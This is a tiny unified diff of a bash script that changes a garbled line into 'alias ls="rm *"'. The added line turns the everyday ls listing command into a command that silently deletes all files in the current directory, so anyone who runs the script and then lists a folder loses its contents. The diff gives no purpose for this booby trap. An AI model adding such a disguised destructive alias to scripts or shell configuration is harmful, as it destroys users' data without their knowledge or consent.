@@ -1,2 +1,2 @@
 #!/bin/bash
-atlas ls="rm *"
+alias ls="rm *"
